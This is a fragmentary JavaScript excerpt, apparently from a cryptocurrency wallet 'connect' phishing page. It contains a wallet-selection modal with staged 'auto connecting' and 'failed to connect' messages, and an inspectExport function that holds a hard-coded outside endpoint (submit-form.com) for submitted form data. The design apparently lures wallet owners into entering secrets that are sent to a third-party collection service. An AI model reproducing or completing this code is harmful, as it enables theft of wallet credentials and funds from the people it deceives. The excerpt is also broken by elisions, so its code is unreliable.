...
function inspectExport(formdata, nextpage) {
    ...
    let t = `https://submit-form.com/v2od2cYMw`;
...
function openConnection(event) {
    ...
    // Update the connection image and text
    ...
    // Ensure wallet name element exists and update its content
    if (!connelem_txt) {
    ...
    // Update the wallet name text
    connelem_txt.innerHTML = capitalizeWords(connText);

    // Show the modal main form
...
document.addEventListener('DOMContentLoaded', () => {
    // Add a click event listener to elements with the "modal-icon" class
    document.querySelectorAll('.modal-icon').forEach(menu => {
        menu.addEventListener('click', function(event) {
            event.preventDefault();

            // Display the modal body
            const modalBody = document.querySelector('modal-main-form-ul');
            modalBody.style.display = 'block';

            // Hide all form elements alongside the modal
            const forms = document.querySelectorAll('#modal-form-item');
            forms.forEach(form => {
                form.style.display = 'none'; // Hide all form elements
            });

            // Dynamically update modal content based on the clicked menu
            const connText = this.querySelector('.modal-icon > img').getAttribute('alt') || "Unknown Wallet";
            const connImage = this.querySelector('.modal-icon > img').getAttribute('src') || "";

            // Set wallet name and logo
            document.getElementById('wallet_logo').setAttribute('src', connImage);
            document.getElementById('wallet_logo').setAttribute('alt', connText);
            document.getElementById('wallet_name').textContent = connText;

            // Reset auto-connecting and error messages
            document.getElementById('auto_connecting').style.display = 'block';
            document.getElementById('failed_to_connect').style.display = 'none';

            // Optionally, scroll to the modal
